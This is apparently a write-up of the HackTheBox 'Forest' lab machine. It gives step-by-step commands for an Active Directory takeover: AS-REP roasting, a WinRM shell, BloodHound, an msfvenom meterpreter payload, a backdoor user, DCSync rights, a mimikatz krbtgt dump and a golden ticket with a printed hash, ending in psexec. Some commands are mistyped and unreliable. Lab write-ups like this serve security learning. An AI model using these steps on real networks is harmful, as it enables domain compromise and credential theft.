# Forest ðŸŒ²

# Recon  

A lot of open ports found in this windows box `53,88,135,139,389,445,464,593,636,3268,3269`, First I am going to try smb on port 445 using smbmap `smbmap -H 10.10.10.161` to see if any of the shares are open, but nothing. At this point I run enum4linux hopefully getting some juicy usernames to try on smbmap. `enum4linux -U 10.10.10.161`, I get a list of usernames and I write it to a notepad. I try some of the but nothing comes up.So at this point smb does't do much for me. I try to look into ldap using jxplorer, but nothing there also. Since there is kerberos, I download impacket and look into the examples script. There is a script which allows me to grab tgt of some users which kerberos does not require them preauthentication. I will use this command `./GetNPUsers.py htb.local/ -no-pass -usersfile user.txt`, I get a result of the tgt for user *svc-alfresco*, I crack this using hashcat, and get the password *s3rvice*.

# User

Trying this user with smb does not give me much neither does with any other service on the ports we found. So I scan again using nmap on all ports and find out winrm port open `5985`. I use a tool named evil-winrm to get a powershell shell on the box, and grab user.txt.

# Root

I upload to the box and import using `. .\bloodhound.ps1`, 2 powershell scripts, first is **bloodhound.ps1** and the other is **powerview.ps1**.
 
 1. I am going to run BloodHound.ps1  `Invoke-Bloodhound -CollectionMethod All -LdapPort 389 -LdaPpass s3rvice`, this would create a zip file which I copy to my local box, and after that I import it to bloodhound application to view a path to *Domain admin*.

  I generate an exe file using msfvenom and upload it into the box using impacket-smbserver. I execute the file and get a    meterpreter shell on my host. I create a new user using `net user fuxsocy passwordhere! /add` and then add him to account *operators group* and *exchange windows permission* and `remote managemenet` by typing `net GroupNAMEHERE group_name fuxsocy /add`.
  
  2. Now I log out from evil-winrm and login as the new created user. I upload get again a meterpreter reverse shell, and now since I am member of EXCHANGE WINDOWS PERMISSIONS i have permision to modifyd DACL(Discretionary Access Control List) which will grant me access to an object. I open powershell from meterpreter by opening  `shell` and then `powershell.exe` I import `. .\powerview.ps1` I type *`Add-DomainObjectAcl -TargetIdentity htb.local -Rights DCSync`*. If no erros shows then I am good to go. I upload *mimkatz* on the box, and run it using `.\mimikatz.exe`. Then I type lsa::dsync /user:krbtgt and grab the output from it.

-------------
  
  Since I have the tgt of that krbtgt user I can use ticketer.py from impacket to create a golden ticket. `python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain HTB.local administrator` and then set the filename to a variable named KRB5CCNAME using `export KRB5CCNAME=administrator.ccache`, now I have golden ticket which I can use with psexec to execute commands on the box as administator. I use `psexec.py -k -n htb.local/administrator@forest.htb.local cmd.exe` Which will pop a shell as nt authority\system.
